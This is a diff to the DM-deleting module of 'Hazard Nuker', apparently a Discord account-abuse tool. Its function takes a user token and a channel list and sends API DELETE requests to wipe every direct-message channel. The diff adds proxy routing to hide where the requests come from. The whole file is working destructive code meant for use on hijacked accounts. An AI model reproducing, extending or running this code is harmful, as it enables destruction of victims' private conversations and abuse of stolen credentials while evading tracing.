@@ -1,23 +1,19 @@
 # Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
+# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
 import requests
-import json
 import Hazard
 from colorama import Fore
 
-from util.plugins.common import print_slow, getheaders
+from util.plugins.common import print_slow, getheaders, proxy
 
-def DmDeleter(token):
-    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
-    for channel in channelIds:
+def DmDeleter(token, channels):
+    for channel in channels:
         try:
-            requests.delete(f'https://discord.com/api/v9/channels/'+channel['id'],
+            requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'],
+            proxies={"http": f'{proxy()}'},
             headers=getheaders(token))
             print(f"{Fore.RED}Deleted DM: {Fore.WHITE}"+channel['id']+Fore.RESET)
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
-    print_slow(f"{Fore.RED}Deleted all available DM's ")
-    print("Enter anything to continue. . . ", end="")
-    input()
-    Hazard.main()
